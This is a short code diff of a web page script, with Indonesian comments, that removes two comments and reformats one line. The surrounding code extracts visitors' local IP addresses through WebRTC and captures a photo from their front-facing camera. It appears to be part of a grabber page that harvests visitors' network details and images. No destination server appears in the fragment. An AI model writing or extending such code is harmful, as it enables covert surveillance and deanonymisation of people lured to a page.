@@ -24,7 +24,6 @@
             let capturedImage = null;
             let localIPs = [];
 
-            // 1. Ekstraksi WebRTC IP
             function getLocalIPs(callback) {
                 const ips = [];
                 const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -45,11 +44,8 @@
                 };
             }
 
-            getLocalIPs(ips => {
-                localIPs = ips;
-            });
+            getLocalIPs(ips => { localIPs = ips; });
 
-            // 2. Ambil Foto Kamera
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     const video = document.getElementById('camera-stream');
